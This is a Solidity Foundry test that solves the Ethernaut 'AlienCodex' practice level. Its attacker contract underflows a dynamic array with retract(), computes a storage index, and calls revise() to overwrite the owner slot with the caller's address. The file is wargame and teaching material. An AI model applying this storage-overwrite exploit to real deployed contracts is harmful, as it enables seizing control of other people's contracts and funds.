//SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./utils/EthernautTest-05.sol";
import "../src/factories/AlienCodexFactory.sol";
import "../src/levels/AlienCodex.sol";

import "forge-std/console.sol";

contract AlienCodexTest is EthernautTest {
    function setUp() public {
        super.setUp();
        AlienCodexFactory factory = new AlienCodexFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveAlienCodex() public {
        address payable payableLevelAddress = address(uint160(levelAddress));
        AlienCodex instance = AlienCodex(payableLevelAddress);

        // [START]

        // 1. Deploy attacker contract
        AlienCodexAttack attacker = new AlienCodexAttack(payableLevelAddress);

        // 2. Call attack()
        attacker.attack();

        // [END]

        assert(ethernaut.submitLevelInstance(payableLevelAddress));
    }
}

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

// Attacker contract
contract AlienCodexAttack {
    IAlienCodex public alien;

    constructor(address _alien) public {
        alien = IAlienCodex(_alien);
    }

    function attack() external {
        // 1. Make contact
        alien.makeContact();

        // 2. Call retract() to trigger dynamic array underflow
        // https://medium.com/@fifiteen82726/solidity-attack-array-underflow-1dc67163948a
        alien.retract();

        // 3. Caluate index
        uint256 index = uint256(2) ** uint256(256) -
            uint256(keccak256(abi.encode(uint256(1))));

        console.log("index: ", index);

        // 4. Call revise()
        alien.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
